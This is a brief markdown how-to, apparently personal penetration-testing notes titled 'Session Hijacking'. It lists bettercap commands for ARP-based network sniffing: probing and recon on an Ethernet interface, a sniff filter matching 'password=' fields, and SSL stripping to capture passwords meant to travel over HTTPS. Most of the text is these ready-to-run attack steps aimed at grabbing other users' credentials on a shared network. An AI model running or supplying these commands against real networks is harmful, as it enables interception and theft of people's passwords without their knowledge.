# Session Hijacking

When we try to use ZAP and BURP within the network that acts as a proxy in between the Web Application and Web Server.

It's not MITM :)) 

Although we can use ettercap, bettercap etc to perform ARP Poisoning and MITIM/Sniffing attacks over the network we are connected to. 

1. Run Bettercap via Ethernet Interface of your choice.
```
bettercap -iface eth0
```

2. net.probe on --> enabling network probinf
3. net.recon on --> enabling recon mode on over the network
4. net.sniff on --> enabling network sniffing
5. set net.sniff.regexp '.\*password=.\*' --> The password field will be changed as per the requirements, we need to know how the password are being floated over the network.
6. set http.proxy.sslstrip true --> to hunt down password floating over HTTPS rather than HTTP